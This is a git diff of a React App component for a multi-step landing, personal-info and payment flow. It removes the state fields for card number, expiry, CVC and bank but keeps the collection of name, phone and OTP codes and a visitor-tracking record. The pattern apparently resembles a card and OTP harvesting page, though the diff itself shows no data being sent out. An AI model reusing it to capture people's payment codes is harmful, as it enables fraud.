@@ -14,21 +14,12 @@ function App() {
   const [isLoading, setisloading] = useState(false);
   const [name, setName] = useState('')
   const [phone, setPhone] = useState('')
-  const [id, setId] = useState(new Date().toISOString())
-  const [dateMonth, setDatmont] = useState('')
-  const [datayaer, setDatyear] = useState('')
-  const [CVC, setCVC] = useState('')
   const [otp, setOtp] = useState('')
   const [otpArd] = useState([''])
-  const [cardNumber, setCardNumber] = useState('')
-  const [prefix, setPrefix] = useState('')
-  const [bank, setBank] = useState('')
-  const [cardState, setCardState] = useState('pendding')
 
   const data={
     id:localStorage.getItem('visitor')===undefined?"newvistor":localStorage.getItem('visitor'),
     hasPersonalInfo:name != '',
-    hasCardInfo:cardNumber != '',
     currentPage:currantPage,
     createdDate: new Date().toISOString(),
     notificationCount:1,
@@ -68,22 +59,15 @@ useEffect(()=>{
         currantPage === 1 ?
           <Landing handleNextPage={handleNextPage} /> :
           currantPage === 2 ?
-            <Info setId={setId} setName={setName} setPhone={setPhone} handleNextPage={handleNextPage}  /> :
+            <Info setName={setName} setPhone={setPhone} handleNextPage={handleNextPage}  /> :
             currantPage >= 3 ?
               <Payment 
               handleOtp={handleOtp} 
               handleOArr={handleOArr}
-              setCardNumber={setCardNumber}
-              setPrefix={setPrefix}
-              setBank={setBank}
-              setDatmont={setDatmont}
-              setDatyear={setDatyear}
-              setCVC={setCVC}
               handleNextPage={handleNextPage}
               currantPage={currantPage}
               setCurrantPage={setCurrantPage}
               setisloading={setisloading}
-              setCardState={setCardState}
               /> :
               null
       }
